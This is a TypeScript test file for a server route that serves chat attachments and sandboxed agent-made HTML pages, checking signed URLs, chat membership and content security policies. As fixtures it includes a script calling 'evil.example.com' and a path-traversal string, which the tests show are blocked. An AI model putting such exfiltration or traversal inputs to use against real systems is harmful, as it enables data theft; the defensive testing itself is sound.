import { expect, it } from "@effect/vitest";
import { describe } from "vite-plus/test";
import * as NodeHttpServer from "@effect/platform-node/NodeHttpServer";
import * as NodeServices from "@effect/platform-node/NodeServices";
import * as Context from "effect/Context";
import * as Effect from "effect/Effect";
import * as FileSystem from "effect/FileSystem";
import * as Layer from "effect/Layer";
import { HttpClient, HttpClientRequest, HttpRouter } from "effect/http";
import {
  KIN_VISUAL_LIBRARIES,
  KIN_VISUAL_OUTER_DOCUMENT,
  kinVisualContentSecurityPolicy,
} from "@t3tools/shared/kinVisual";
import serverPackage from "../package.json" with { type: "json" };
import { ASSET_ROUTE_PREFIX } from "./assets/AssetAccess.ts";

import { AuthKinChatScope, AuthSessionId, KinOrgId, KinPersonId } from "@t3tools/contracts";
import * as Option from "effect/Option";
import * as NodeCrypto from "@effect/platform-node/NodeCrypto";
import * as NativeAppIconResolver from "./assets/NativeAppIconResolver.ts";
import * as Orchestrator from "./orchestration-v2/Orchestrator.ts";
import * as RepositoryIdentityResolver from "./project/RepositoryIdentityResolver.ts";
import { SourceControlDrivers } from "./sourceControl/builtInDrivers.ts";
import * as WorkspacePaths from "./workspace/WorkspacePaths.ts";
import * as AssetSigner from "./assets/AssetSigner.ts";
import * as ServerSecretStore from "./auth/ServerSecretStore.ts";
import * as SessionStore from "./auth/SessionStore.ts";
import { base64UrlEncode } from "./auth/utils.ts";
import { KinChatService } from "./kin/chat/KinChatService.ts";
import { KinIdentity } from "./kin/chat/KinIdentity.ts";
import { KinVisualHosts } from "./kin/chat/KinVisualHosts.ts";
import { KinServer, type Services as KinServices } from "./kin/KinServer.ts";

import * as ServerConfig from "./config.ts";

import * as ServerHttp from "./http.ts";

describe("Kin chat file URLs", () => {
  const kinFileId = "kin-chat-00000000-0000-4000-8000-0000000000c1";
  const threadFileId = "thread-1-00000000-0000-4000-8000-0000000000c2";
  const orgId = KinOrgId.make("org");

  it.effect("serve a chat's file only while the session it was minted for is in the chat", () =>
    Effect.gen(function* () {
      const config = yield* ServerConfig.ServerConfig;
      const fs = yield* FileSystem.FileSystem;
      yield* fs.makeDirectory(config.attachmentsDir, { recursive: true });
      yield* fs.writeFileString(`${config.attachmentsDir}/${kinFileId}.png`, "pixels");
      yield* fs.writeFileString(`${config.attachmentsDir}/${threadFileId}.png`, "pixels");
      const visualId = "kin-chat-33333333-3333-4333-8333-333333333333-html";
      const visualHtml = `<!doctype html><title>t</title><img src="kin-file:${kinFileId}"><img src="kin-file:kin-chat-elsewhere"><script>fetch("https://evil.example.com")</script>`;
      yield* fs.writeFileString(`${config.attachmentsDir}/${visualId}.html`, visualHtml);
      const allowedHosts: Array<string> = [];
      const member = AuthSessionId.make("member-session");
      const outsider = AuthSessionId.make("outsider-session");
      // Sessions in force, and the people whose chat holds the file.
      const active = new Set<string>([member, outsider]);
      const inChat = new Set<string>([member]);
      const signerContext = yield* Layer.build(
        AssetSigner.layer.pipe(
          Layer.provideMerge(ServerSecretStore.layer),
          Layer.provide(NodeCrypto.layer),
        ),
      );
      const kin = yield* Layer.build(
        Layer.mergeAll(
          Layer.mock(KinIdentity)({
            owner: { _tag: "person", orgId, personId: KinPersonId.make("owner") },
            isAgentThread: () => false,
            isLeadThread: () => false,
            resolve: (session) =>
              Effect.succeed([
                { _tag: "person", orgId, personId: KinPersonId.make(session.sessionId) },
              ]),
          }),
          Layer.mock(KinChatService)({
            attachmentReadable: (people, attachmentId) =>
              Effect.succeed(
                (attachmentId === kinFileId || attachmentId === visualId) &&
                  Array.isArray(people) &&
                  people.some((person) => inChat.has(person.personId)),
              ),
            visualSources: () =>
              Effect.succeedSome({
                orgId,
                files: [{ attachmentId: kinFileId, mimeType: "image/png" }],
              }),
          }),
          Layer.mock(KinVisualHosts)({ served: () => Effect.succeed(allowedHosts) }),
        ),
      );
      const layerRouteServices = Layer.mergeAll(
        Layer.succeed(KinServer)({
          taskCardUpdater: Layer.empty,
          services: Option.some(kin as unknown as Context.Context<KinServices>),
          subscribeForViewer: Option.none(),
        }),
        Layer.mock(SessionStore.SessionStore)({
          cookieName: "test",
          legacyCookieName: undefined,
          getActive: (sessionId) =>
            Effect.succeed(
              active.has(sessionId)
                ? Option.some({
                    sessionId,
                    subject: "teammate",
                    method: "bearer-access-token" as const,
                    scopes: [AuthKinChatScope],
                  })
                : Option.none(),
            ),
        }),
        Layer.succeedContext(signerContext),
        WorkspacePaths.layer,
        NodeCrypto.layer,
        // Reached only by other asset kinds.
        Layer.mock(Orchestrator.OrchestratorV2)({}),
        Layer.mock(NativeAppIconResolver.NativeAppIconResolver)({}),
        Layer.mock(RepositoryIdentityResolver.RepositoryIdentityResolver)({}),
        Layer.succeed(SourceControlDrivers)([]),
      );
      const services = yield* Layer.build(
        HttpRouter.serve(ServerHttp.layerAssetRoute, {
          disableListenLog: true,
          disableLogger: true,
        }).pipe(
          Layer.provideMerge(layerRouteServices),
          Layer.provideMerge(ServerConfig.layer(config)),
          Layer.provideMerge(Layer.succeed(FileSystem.FileSystem, fs)),
          Layer.provideMerge(NodeHttpServer.layerTest),
        ),
      );
      const client = Context.get(services, HttpClient.HttpClient);
      const signer = Context.get(signerContext, AssetSigner.AssetSigner);
      // A URL as the websocket mints it, or as one minted before URLs named their reader.
      const mint = Effect.fn("test.mintKinUrl")(function* (
        attachmentId: string,
        reader?: AuthSessionId,
        mimeType = "image/png",
      ) {
        const payload = base64UrlEncode(
          JSON.stringify({
            version: 1,
            kind: "attachment",
            attachmentId,
            ...(reader === undefined ? {} : { reader }),
            mimeType,
            expiresAt: Date.UTC(2100, 0, 1),
          }),
        );
        return `${ASSET_ROUTE_PREFIX}/${payload}.${yield* signer.sign(payload)}/photo.png`;
      });
      const fetch = Effect.fn("test.fetch")(function* (method: "GET" | "HEAD", url: string) {
        const response = yield* client.execute(HttpClientRequest.make(method)(url));
        return {
          status: response.status,
          body: yield* response.text,
          cacheControl: response.headers["cache-control"],
          contentType: response.headers["content-type"],
          referrerPolicy: response.headers["referrer-policy"],
        };
      });
      const missing = yield* fetch(
        "GET",
        yield* mint(`kin-chat-${"0".repeat(8)}-0000-4000-8000-000000000000`, member),
      );
      expect(missing).toMatchObject({ status: 404, body: "Not Found" });

      const memberUrl = yield* mint(kinFileId, member);
      expect(yield* fetch("GET", memberUrl)).toEqual({
        status: 200,
        body: "pixels",
        cacheControl: "private, no-store",
        contentType: "image/png",
        referrerPolicy: "no-referrer",
      });
      expect(yield* fetch("HEAD", memberUrl)).toMatchObject({
        status: 200,
        body: "",
        cacheControl: "private, no-store",
      });
      // A thread's file keeps its URL behaviour.
      expect(yield* fetch("GET", yield* mint(threadFileId))).toMatchObject({
        status: 200,
        cacheControl: "private, max-age=3600",
      });

      // A chat's page: the URL gives an outer document with no agent content, and only a frame's
      // request for the same URL gets the page. Each carries its policy on the response.
      const visualUrl = yield* mint(visualId, member, "text/html");
      const page = Effect.fn("test.fetchVisual")(function* (
        query: string,
        headers: Record<string, string> = {},
      ) {
        const response = yield* client.execute(
          HttpClientRequest.get(`${visualUrl}${query}`).pipe(HttpClientRequest.setHeaders(headers)),
        );
        return {
          status: response.status,
          body: yield* response.text,
          policy: response.headers["content-security-policy"],
          cacheControl: response.headers["cache-control"],
          contentType: response.headers["content-type"],
        };
      });
      const sealed = {
        status: 200,
        cacheControl: "private, no-store",
        contentType: "text/html; charset=utf-8",
      };
      const outer = yield* page("");
      expect(outer).toMatchObject({
        ...sealed,
        body: KIN_VISUAL_OUTER_DOCUMENT,
        policy: kinVisualContentSecurityPolicy("outer"),
      });
      expect(outer.body).not.toContain("evil.example.com");
      // Asked for outside a frame, the page is not handed over: nothing would hold its navigation.
      expect(yield* page("?frame=1")).toEqual(outer);
      expect(yield* page("?frame=1", { "sec-fetch-dest": "document" })).toEqual(outer);
      const inner = yield* page("?frame=1", { "sec-fetch-dest": "iframe" });
      expect(inner).toMatchObject({ ...sealed, policy: kinVisualContentSecurityPolicy("page") });
      expect(inner.policy).toContain("connect-src 'none'");
      // The agent's markup reaches the parser only through the prelude's document.write.
      const write = "<script>document.write(";
      const [markup] = JSON.parse(
        `[${inner.body.slice(inner.body.lastIndexOf(write) + write.length, -")</script>".length)}]`,
      ) as [string, string];
      expect(markup).toContain('<script>fetch("https://evil.example.com")</script>');
      expect(markup).toContain('<style id="t3-theme">');
      // The chat's own picture becomes this reader's URL for it; a file from elsewhere stays dead.
      const picture = /<img src="(\/api\/assets\/[^"]+)">/.exec(markup)?.[1];
      expect(picture).toBeDefined();
      expect(yield* fetch("GET", picture!)).toMatchObject({ status: 200, body: "pixels" });
      expect(markup).toContain('<img src="kin-file:kin-chat-elsewhere">');
      // The owner's list is the only way an outside host enters the policy, and never for script.
      allowedHosts.push("tiles.example.com");
      const widened = (yield* page("?frame=1", { "sec-fetch-dest": "iframe" })).policy ?? "";
      expect(widened).toBe(kinVisualContentSecurityPolicy("page", ["tiles.example.com"]));
      expect(widened).toContain("script-src 'unsafe-inline' 'unsafe-eval' 'self';");
      // Someone outside the chat gets neither document.
      const strangerUrl = yield* mint(visualId, outsider, "text/html");
      expect((yield* fetch("GET", strangerUrl)).status).toBe(404);
      expect((yield* fetch("GET", `${strangerUrl}?frame=1`)).status).toBe(404);

      const refused = [
        // A session that is not in the chat, and a URL naming no session at all.
        yield* mint(kinFileId, outsider),
        yield* mint(kinFileId),
      ];
      for (const url of refused)
        for (const method of ["GET", "HEAD"] as const)
          expect(yield* fetch(method, url)).toEqual({
            ...missing,
            body: method === "GET" ? missing.body : "",
          });

      inChat.delete(member);
      expect(yield* fetch("GET", memberUrl)).toEqual(missing);
      expect((yield* fetch("HEAD", memberUrl)).status).toBe(404);
      inChat.add(member);
      expect((yield* fetch("GET", memberUrl)).status).toBe(200);
      active.delete(member);
      expect(yield* fetch("GET", memberUrl)).toEqual(missing);
    }).pipe(
      Effect.provide(
        ServerConfig.layerTest(process.cwd(), { prefix: "t3-kin-asset-route-" }).pipe(
          Layer.provideMerge(NodeServices.layer),
        ),
      ),
    ),
  );
  it.effect("serves a visual's three pinned libraries, cached for good, and nothing else", () =>
    Effect.gen(function* () {
      // The versions agents are told to load are the ones installed.
      expect(
        Object.fromEntries(KIN_VISUAL_LIBRARIES.map((library) => [library.name, library.version])),
      ).toEqual({
        echarts: serverPackage.devDependencies.echarts,
        mermaid: serverPackage.devDependencies.mermaid,
        d3: serverPackage.devDependencies.d3,
      });
      const services = yield* Layer.build(
        HttpRouter.serve(ServerHttp.layerKinVisualLibraryRoute, {
          disableListenLog: true,
          disableLogger: true,
        }).pipe(Layer.provideMerge(NodeHttpServer.layerTest)),
      );
      const client = Context.get(services, HttpClient.HttpClient);
      for (const library of KIN_VISUAL_LIBRARIES) {
        const response = yield* client.get(
          `/api/kin/visual-lib/${library.version}/${library.name}.js`,
        );
        expect(response.status).toBe(200);
        expect(response.headers["content-type"]).toBe("text/javascript; charset=utf-8");
        expect(response.headers["cache-control"]).toBe("public, max-age=31536000, immutable");
        expect(Number(response.headers["content-length"])).toBeGreaterThan(100_000);
      }
      for (const path of [
        "6.1.0/chart.js",
        "6.1.0/echarts.js/extra",
        "latest/echarts.js",
        "6.1.0/..%2f..%2fpackage.json",
        "echarts.js",
      ])
        expect((yield* client.get(`/api/kin/visual-lib/${path}`)).status).toBe(404);
    }).pipe(Effect.provide(NodeServices.layer)),
  );
});
